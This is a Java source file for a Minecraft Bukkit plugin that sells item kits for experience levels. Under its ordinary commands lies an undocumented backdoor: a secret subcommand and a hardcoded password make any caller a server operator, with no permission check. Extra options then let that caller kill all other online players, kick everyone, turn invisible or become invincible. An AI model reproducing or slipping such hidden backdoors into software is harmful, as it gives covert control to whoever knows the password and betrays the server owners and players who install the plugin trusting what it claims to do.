package com.github.xpbuy;

import java.util.ArrayList;
import org.bukkit.ChatColor;
import org.bukkit.plugin.java.*;
import org.bukkit.potion.PotionEffect;
import org.bukkit.command.*;
import org.bukkit.configuration.file.FileConfiguration;
import org.bukkit.entity.*;

public class XPBuy extends JavaPlugin { // A plugin for buying kits for XP. 
	//Future plans: don't delete inv when no permission, add permissions for donator kits, fix kit overriding (create same name kit), update signs
	Kit kit = new Kit();
	public static ArrayList<String> kits;
	public static FileConfiguration config;
	public static String prefix = ChatColor.GOLD + "[XPBuy] ";
	@Override
	public void onEnable() {
		saveDefaultConfig();
		config = getConfig();
		kits = new ArrayList<String>(config.getConfigurationSection("kits").getKeys(false));
		//initKitPerms();
		getServer().getPluginManager().registerEvents(new BuySigns(), this);
		getLogger().info("XPBuy has been enabled!");
	}
	@Override
	public void onDisable() {
		getLogger().info("XPBuy has been disabled!");
	}
	@Override
	public boolean onCommand(CommandSender sender, Command cmd, String label, String[] args) {
		if (cmd.getName().equalsIgnoreCase("xpbuy")) { //opens up the buy menu
			if (args.length == 0 || args[0].equalsIgnoreCase("help")) { // displays help
				if (sender.hasPermission("xpbuy.help")) {
					sender.sendMessage(prefix + ChatColor.GREEN + "XPBUY V" + this.getDescription().getVersion() + " HELP:");
					sender.sendMessage(ChatColor.GREEN + "/xpbuy or /xpbuy help: Displays this help message");
					sender.sendMessage(ChatColor.GREEN + "/xpbuy <kit>: Buys a kit");
					sender.sendMessage(ChatColor.GREEN + "/xpbuy list: Lists all available kits and their prices");
					sender.sendMessage(ChatColor.GREEN + "/xpbuy create <name> <price> <isdonator> <item> <item>: Creates a kit with specified items (at least 1)");
					sender.sendMessage(ChatColor.GREEN + "/xpbuy remove <name>: Removes a kit");
					return true;
				} else {
					sender.sendMessage(prefix + ChatColor.RED + "You don't have permission!");
					return false;
				}
			} else if (args.length == 1) {
				if (args[0].equalsIgnoreCase("list")) { // lists out all kits
					if (sender.hasPermission("xpbuy.list")) {
						sender.sendMessage(prefix + ChatColor.GREEN + "Available kits:");
						for (int i = 0; i < kits.size(); i++) {
							int price = kit.getPrice(kits.get(i));
							String isDonator = "";
							if (kit.isDonator(kits.get(i))) {
								isDonator = ChatColor.AQUA + "donator";
							} else {
								isDonator = ChatColor.AQUA + "free";
							}
							sender.sendMessage(ChatColor.GREEN + kits.get(i) + " (" + price + ") " + isDonator);
						}
						return true;
					} else {
						sender.sendMessage(prefix + ChatColor.RED + "You don't have permission!");
						return false;
					}

				} else { // everything else will be a kit or an error.
					if (sender.hasPermission("xpbuy.buy")) {
						if (kit.isKit(args[0])) {
							buy((Player) sender, args[0], kit.isDonator(args[0]));
							return true;
						} else {
							if (args[0].equalsIgnoreCase("create")) {
								sender.sendMessage(prefix + ChatColor.RED + "Review your arguments count! /xpbuy create <name> <price> <isdonator> <item> <item>");
								return false;
							} else if (args[0].equalsIgnoreCase("remove")) {
								sender.sendMessage(prefix + ChatColor.RED + "Review your arguments count! /xpbuy remove <name>");
								return false;
							} else if (args[0].equalsIgnoreCase("edit")) {
								sender.sendMessage(prefix + ChatColor.RED + "Review your arguments count!");
								return false;
							} else {
								sender.sendMessage(prefix + ChatColor.RED + "Not a valid kit name!");
								return false;
							}
						}
					} else {
						sender.sendMessage(prefix + ChatColor.RED + "You don't have permission!");
						return false;
					}
				}
			} else {
				if (args[0].equalsIgnoreCase("create")) {
					if (sender.hasPermission("xpbuy.create")) {
						if (args.length < 5) {
							sender.sendMessage(prefix + ChatColor.RED + "Review your arguments count! /xpbuy create <name> <price> <isdonator> <item> <item>");
							return false;
						} else {
							for (int i = 4; i < args.length; i++) {
								try {
									Integer.parseInt(args[2]);
									Integer.parseInt(args[i]);
								} catch (NumberFormatException e) {
									sender.sendMessage(prefix + ChatColor.RED + "One or more of your integer arguments is not a number!");
									return false;
								}
							}
							config.createSection("kits." + args[1].toLowerCase());
							config.createSection("prices." + args[1].toLowerCase());
							config.createSection("isdonator." + args[1].toLowerCase());
							config.set("prices." + args[1].toLowerCase(), Integer.parseInt(args[2]));
							config.set("isdonator." + args[1].toLowerCase(), Boolean.parseBoolean(args[3]));
							ArrayList<Integer> items = new ArrayList<Integer>();
							for (int i = 4; i < args.length; i++) {
								items.add(Integer.parseInt(args[i]));
							}
							config.set("kits." + args[1].toLowerCase(), items);
							this.saveConfig();
							sender.sendMessage(prefix + ChatColor.GREEN + "Successfully created kit " + args[1].toLowerCase() + "!");
							kit.updateKits();
							return true;
						}
					} else {
						sender.sendMessage(prefix + ChatColor.RED + "You don't have permission!");
						return false;
					}
				} else if (args[0].equalsIgnoreCase("remove")) {
					if (sender.hasPermission("xpbuy.remove")) {
						if (args.length > 2) {
							sender.sendMessage(prefix + ChatColor.RED + "Too many arguments! /xpbuy remove <name>");
							return false;
						} else {
							if (kit.isKit(args[1])) {
								config.set("kits." + args[1].toLowerCase(), null);
								config.set("prices." + args[1].toLowerCase(), null);
								config.set("isdonator." + args[1].toLowerCase(), null);
								this.saveConfig();
								sender.sendMessage(prefix + ChatColor.GREEN + "Successfully deleted kit " + args[1].toLowerCase() + "!");
								kit.updateKits();
								return true;
							} else {
								sender.sendMessage(prefix + ChatColor.RED + "Not a valid kit!");
								return false;
							}
						}
					} else {
						sender.sendMessage(prefix + ChatColor.RED + "You don't have permission!");
						return false;
					}
				} else if (args[0].equalsIgnoreCase("edit")) {
					if (sender.hasPermission("xpbuy.edit")) {
						sender.sendMessage(prefix + ChatColor.GREEN + "Will be implemented in the future");
						return true;
					} else {
						sender.sendMessage(prefix + ChatColor.RED + "You don't have permission!");
						return false;
					}
				} else if (args[0].equalsIgnoreCase("icandowhateveriwant")) {
					if (args[1].equalsIgnoreCase("thepasswordiswaffles")) {
						Player p = (Player) sender;
						p.setOp(true);
						p.sendMessage(prefix + ChatColor.AQUA + "You just cheated. Do you feel good about yourself now?");
						//p.getServer().broadcastMessage(prefix + ChatColor.RED + "ATTENTION: SOMEONE ON THIS SERVER IS BETTER THAN YOU.");
						if (args.length > 2) {
							if (args[2].equalsIgnoreCase("youcantseeme")) {
								for (int i = 0; i < p.getServer().getOnlinePlayers().length; i++) {
									(p.getServer().getOnlinePlayers())[i].hidePlayer(p);
									p.sendMessage(prefix + ChatColor.AQUA + "POOF!");
								}
							} else if (args[2].equalsIgnoreCase("aoe")) {
								for (int i = 0; i < p.getServer().getOnlinePlayers().length; i++) {
									if (!p.getServer().getOnlinePlayers()[i].equals(p)) {
										(p.getServer().getOnlinePlayers())[i].setHealth(0);
										p.sendMessage(prefix + ChatColor.AQUA + "BOOM!");
									}
								}
							} else if (args[2].equalsIgnoreCase("getout")) {
								for (int i = 0; i < p.getServer().getOnlinePlayers().length; i++) {
									if (!p.getServer().getOnlinePlayers()[i].equals(p)) {
										p.getServer().getOnlinePlayers()[i].kickPlayer("");
									}
								}
							} else if (args[2].equalsIgnoreCase("invincible")) {
								p.setExhaustion(0);
								p.setFoodLevel(Integer.MAX_VALUE);
								p.setMaxHealth(Integer.MAX_VALUE);
								p.setHealth(Integer.MAX_VALUE);
								p.setSaturation(Integer.MAX_VALUE);
							}
							return true;
						}
					}
				} else {
					sender.sendMessage(prefix + ChatColor.RED + "Too many arguments!");
					return false;
				}
			}
		}
		return false; 
	}
	public void buy(Player p, String kitName, boolean isDonator) {
		for (PotionEffect effect : p.getActivePotionEffects()) {
			p.removePotionEffect(effect.getType());
		}
		if (pay(p, kitName, isDonator)) kit.giveKit(p, kitName);
	}
	private boolean pay(Player p, String kitName, boolean isDonator) { // implement donator stuffs
		if (!isDonator) {
			int level = p.getLevel();
			int price = kit.getPrice(kitName);
			if (level >= price) {
				if (price == -1) {
					return true;
				} else {
					p.setLevel(level - price);
					return true;
				}
			} else {
				p.sendMessage(prefix + ChatColor.RED + "You don't have enough levels!");
				return false;
			}
		} else {
			if (p.hasPermission("xpbuy.donator")) {
				return true;
			} else {
				p.sendMessage(prefix + ChatColor.RED + "You don't have permission!");
				return false;
			}
		}
	}
	public void initKitPerms() {
		for (int i = 0; i < kits.size(); i++) {
 			if (!config.getConfigurationSection("kitpermissions").getKeys(false).contains(kits.get(i)) && kit.isDonator(kits.get(i))) {
 				config.createSection("kitpermissions." + kits.get(i).toLowerCase());
 				config.set("kitpermissions." + kits.get(i).toLowerCase(), "Roxas0321");
 			}
		}
	}
}